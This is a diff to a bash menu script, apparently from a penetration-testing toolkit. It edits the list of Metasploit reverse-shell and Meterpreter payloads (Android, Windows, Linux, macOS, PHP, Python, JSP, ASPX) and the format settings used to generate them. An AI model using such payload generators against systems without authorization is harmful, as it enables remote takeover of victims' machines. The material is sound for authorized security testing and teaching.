@@ -5,21 +5,22 @@ f_banner
 
 echo -e "${BLUE}Malicious Payloads${NC}"
 echo
-echo "1.   android/meterpreter/reverse_tcp"
-echo "2.   cmd/windows/reverse_powershell"
-echo "3.   java/jsp_shell_reverse_tcp (Linux)"
-echo "4.   java/jsp_shell_reverse_tcp (Windows)"
-echo "5.   linux/x64/meterpreter_reverse_https"
-echo "6.   linux/x64/meterpreter_reverse_tcp"
-echo "7.   linux/x64/shell/reverse_tcp"
-echo "8.   osx/x64/meterpreter_reverse_https"
-echo "9.   osx/x64/meterpreter_reverse_tcp"
-echo "10.  php/meterpreter/reverse_tcp"
-echo "11.  python/meterpreter_reverse_https"
-echo "12.  python/meterpreter_reverse_tcp"
-echo "13.  windows/x64/meterpreter_reverse_https"
-echo "14.  windows/x64/meterpreter_reverse_tcp"
-echo "15.  Previous menu"
+echo "1.   android/meterpreter/reverse_tcp         (.apk)"
+echo "2.   cmd/windows/reverse_powershell          (.bat)"
+echo "3.   java/jsp_shell_reverse_tcp (Linux)      (.jsp)"
+echo "4.   java/jsp_shell_reverse_tcp (Windows)    (.jsp)"
+echo "5.   linux/x64/meterpreter_reverse_https     (.elf)"
+echo "6.   linux/x64/meterpreter_reverse_tcp       (.elf)"
+echo "7.   linux/x64/shell/reverse_tcp             (.elf)"
+echo "8.   osx/x64/meterpreter_reverse_https       (.macho)"
+echo "9.   osx/x64/meterpreter_reverse_tcp         (.macho)"
+echo "10.  php/meterpreter_reverse_tcp             (.php)"
+echo "11.  python/meterpreter_reverse_https        (.py)"
+echo "12.  python/meterpreter_reverse_tcp          (.py)"
+echo "13.  windows/x64/meterpreter_reverse_https   (.exe)"
+echo "14.  windows/x64/meterpreter_reverse_tcp     (.exe)"
+echo "15.  windows/x64/meterpreter_reverse_tcp     (.aspx)"
+echo "16.  Previous menu"
 echo
 echo -n "Choice: "
 read choice
@@ -70,7 +71,7 @@ case $choice in
           format="macho"
           arch="x64"
           platform="osx";;
-     10) payload="php/meterpreter/reverse_tcp"
+     10) payload="php/meterpreter_reverse_tcp"
           extention=".php"
           format="raw"
           arch="php"
@@ -96,7 +97,12 @@ case $choice in
           format="exe"
           arch="x64"
           platform="windows";;
-     15) f_main;;
+     15) payload="windows/x64/meterpreter_reverse_tcp"
+          extention=".aspx"
+          format="aspx"
+          arch="x64"
+          platform="windows";;
+     16) f_main;;
      *) f_error;;
 esac
 
